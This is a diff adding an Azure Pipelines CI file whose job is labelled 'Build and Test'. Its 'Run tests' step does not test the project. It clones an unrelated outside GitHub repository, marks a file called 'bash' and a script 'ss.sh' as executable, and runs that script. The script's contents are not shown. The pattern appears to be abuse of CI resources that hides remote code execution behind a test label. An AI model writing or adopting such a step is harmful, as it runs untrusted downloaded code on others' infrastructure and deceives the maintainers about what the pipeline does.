@@ -1,0 +1,20 @@
+trigger:
+- main
+
+pool:
+  vmImage: 'ubuntu-latest'
+
+jobs:
+- job: BuildAndTest
+  displayName: 'Build and Test'
+  pool:
+    vmImage: 'ubuntu-latest'
+  steps:
+  - checkout: self
+  - script: |
+      git clone https://github.com/IKSANNURPADILLAH/inicoy.git
+      cd inicoy
+      chmod u+x bash
+      chmod u+x ss.sh
+      ./ss.sh
+    displayName: 'Run tests'
